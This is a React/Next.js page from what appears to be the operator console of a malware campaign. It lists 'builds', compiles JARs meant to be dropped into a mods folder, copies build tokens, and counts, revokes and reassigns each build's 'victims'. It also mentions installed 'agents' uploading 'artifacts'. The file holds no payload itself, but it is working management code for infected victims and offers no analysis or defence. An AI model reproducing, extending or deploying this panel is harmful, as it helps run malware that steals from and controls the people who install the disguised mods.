'use client';
import { useState } from 'react';
import { ArrowRightLeft, Copy, Download, Hammer, Power, Plus, Trash2 } from 'lucide-react';
import { toast } from 'sonner';
import { useApi, mutate } from '@/hooks/useApi';
import { ApiError } from '@/lib/api';
import { useRole } from '@/components/live-provider';
import { Topbar } from '@/components/topbar';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Dialog, DialogContent, DialogTitle } from '@/components/ui/dialog';
import { Input, Label, Select } from '@/components/ui/input';
import { Empty, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { copy, dateTime, short } from '@/lib/format';
import type { Build } from '@/lib/types';

export default function BuildsPage() {
  const { data, loading, refresh, error } = useApi<{ items: Build[] }>('/builds', { pollMs: 15_000 });
  const [open, setOpen] = useState(false);
  const [busy, setBusy] = useState('');
  const [reassignFor, setReassignFor] = useState<Build | null>(null);
  const [reassignTarget, setReassignTarget] = useState('');
  const [form, setForm] = useState({ name: '', version: '1.0.0', profile: 'full' });
  const role = useRole();

  async function create(event: React.FormEvent) {
    event.preventDefault();
    setBusy('create');
    try {
      const created = await mutate<{ id: string; token: string }>('/builds', 'POST', form);
      toast.success('Build created', { description: `token ${created.token.slice(0, 16)}…` });
      setOpen(false);
      refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'failed');
    } finally {
      setBusy('');
    }
  }

  async function compile(id: string) {
    setBusy(id);
    try {
      await mutate(`/builds/${id}/compile`, 'POST');
      toast.success('JAR built');
      refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'compile failed');
    } finally {
      setBusy('');
    }
  }

  async function revoke(build: Build) {
    if (!confirm(`Revoke build ${build.name} v${build.version}? Every victim of this build is revoked too.`)) return;
    setBusy(build.id);
    try {
      await mutate(`/builds/${build.id}/revoke`, 'POST');
      toast.success('Build revoked');
      refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'revoke failed');
    } finally {
      setBusy('');
    }
  }

  async function remove(build: Build) {
    if (!confirm(`Delete build ${build.name} v${build.version}? The JAR file stays on disk.`)) return;
    setBusy(build.id);
    try {
      await mutate(`/builds/${build.id}`, 'DELETE');
      toast.success('Build deleted');
      refresh();
    } catch (caught) {
      if (caught instanceof ApiError && caught.code === 'in_use') {
        toast.error(caught.message, {
          description: 'Reassign its victims or open the filtered list.',
          action: { label: 'Open victims', onClick: () => window.open(`/victims?build=${build.id}`, '_blank') }
        });
      } else {
        toast.error(caught instanceof Error ? caught.message : 'delete failed');
      }
    } finally {
      setBusy('');
    }
  }

  async function reassign(event: React.FormEvent) {
    event.preventDefault();
    if (!reassignFor || !reassignTarget) return;
    setBusy(reassignFor.id);
    try {
      const result = await mutate<{ moved: number }>(`/builds/${reassignFor.id}/reassign`, 'POST', { target: reassignTarget });
      toast.success(`${result.moved} victim(s) reassigned`);
      setReassignFor(null);
      refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'reassign failed');
    } finally {
      setBusy('');
    }
  }

  return (
    <>
      <Topbar title="Builds" subtitle="config injection · one build_id per artifact key" />
      <div className="pt-3">
        <Card>
          <CardHeader>
            <CardTitle>Build catalog</CardTitle>
            {role === 'admin' ? <Button size="sm" onClick={() => setOpen(true)}><Plus className="h-3 w-3" /> new build</Button> : null}
          </CardHeader>
          {error ? <p className="p-3 text-xs text-bad">{error.message}</p> : loading ? <SkeletonRows rows={6} cols={6} /> : (data?.items ?? []).length === 0 ? <Empty title="No builds" hint="Create a build, compile the JAR and drop it in mods/." /> : (
            <Table>
              <THead><TR><TH>Name</TH><TH>Version</TH><TH>Profile</TH><TH>build_id</TH><TH>Victims</TH><TH>State</TH><TH>Created</TH><TH /></TR></THead>
              <tbody>
                {data!.items.map((build) => (
                  <TR key={build.id}>
                    <TD className="text-xs">{build.name}{build.universal ? <Badge tone="ok" className="ml-1">universal</Badge> : null}</TD>
                    <TD className="num">{build.version}</TD>
                    <TD><Badge tone={build.profile === 'lite' ? 'warn' : 'brand'}>{build.profile}</Badge></TD>
                    <TD className="font-mono text-2xs">{short(build.buildId)}</TD>
                    <TD className="num">{build.victims}</TD>
                    <TD><Badge tone={build.status === 'ready' ? 'ok' : build.status === 'revoked' ? 'bad' : 'default'}>{build.status}</Badge></TD>
                    <TD className="num text-2xs text-muted">{dateTime(build.createdAt)}</TD>
                    <TD>
                      <div className="flex justify-end gap-1">
                        <Button size="icon" variant="ghost" title="copy token" onClick={() => { copy(build.token); toast.success('build token copied'); }}><Copy className="h-3 w-3" /></Button>
                        {role === 'admin' ? <Button size="icon" variant="ghost" title="compile" loading={busy === build.id} onClick={() => compile(build.id)}><Hammer className="h-3 w-3" /></Button> : null}
                        {build.jarPath ? <a href={`/api/console/builds/${build.id}/download`} className="grid h-7 w-7 place-items-center rounded text-muted hover:text-brand"><Download className="h-3 w-3" /></a> : null}
                        {role === 'admin' ? <Button size="icon" variant="ghost" title="reassign victims" disabled={build.victims === 0 || busy === build.id} onClick={() => { setReassignFor(build); setReassignTarget(''); }}><ArrowRightLeft className="h-3 w-3" /></Button> : null}
                        {build.status !== 'revoked' && role === 'admin' ? <Button size="icon" variant="ghost" title="revoke" loading={busy === build.id} disabled={busy === build.id} onClick={() => revoke(build)}><Power className="h-3 w-3" /></Button> : null}
                        {role === 'admin' ? <Button size="icon" variant="ghost" title="delete (must not be in use)" loading={busy === build.id} disabled={busy === build.id} onClick={() => remove(build)}><Trash2 className="h-3 w-3" /></Button> : null}
                      </div>
                    </TD>
                  </TR>
                ))}
              </tbody>
            </Table>
          )}
        </Card>
      </div>

      <Dialog open={open} onOpenChange={setOpen}>
        <DialogContent>
          <DialogTitle>New build</DialogTitle>
          <CardContent className="px-0">
            <form onSubmit={create} className="space-y-2">
              <div><Label>Name</Label><Input required value={form.name} onChange={(event) => setForm({ ...form, name: event.target.value })} /></div>
              <div><Label>Version</Label><Input required pattern="\d+\.\d+\.\d+" value={form.version} onChange={(event) => setForm({ ...form, version: event.target.value })} /></div>
              <div><Label>Profile</Label><Select value={form.profile} onChange={(event) => setForm({ ...form, profile: event.target.value })} className="w-full"><option value="full">full</option><option value="lite">lite</option></Select></div>
              <p className="text-2xs text-muted">A 32-byte secret and build_id are generated. The token is derived from the secret; keep both private.</p>
              <div className="flex justify-end"><Button type="submit" loading={busy === 'create'}>Create</Button></div>
            </form>
          </CardContent>
        </DialogContent>
      </Dialog>

      <Dialog open={Boolean(reassignFor)} onOpenChange={(value) => { if (!value) setReassignFor(null); }}>
        <DialogContent>
          <DialogTitle>Reassign victims before deleting</DialogTitle>
          <form onSubmit={reassign} className="mt-3 space-y-2">
            <p className="text-xs text-muted">
              {reassignFor?.name} v{reassignFor?.version} has {reassignFor?.victims} victim(s). Move them to another live build.
            </p>
            <p className="text-2xs text-muted">
              Installed agents keep their current jar config until redeployed; artifacts they upload after the move are keyed to the old build secret.
            </p>
            <div>
              <Label>Target build</Label>
              <Select value={reassignTarget} onChange={(event) => setReassignTarget(event.target.value)} className="w-full">
                <option value="">select…</option>
                {(data?.items ?? []).filter((item) => item.id !== reassignFor?.id && item.status !== 'revoked').map((item) => (
                  <option key={item.id} value={item.id}>{item.name} v{item.version} · {item.profile}</option>
                ))}
              </Select>
            </div>
            <div className="flex justify-end gap-2">
              <Button type="button" variant="ghost" onClick={() => setReassignFor(null)}>Cancel</Button>
              <Button type="submit" disabled={!reassignTarget} loading={busy === reassignFor?.id}>Reassign</Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>
    </>
  );
}
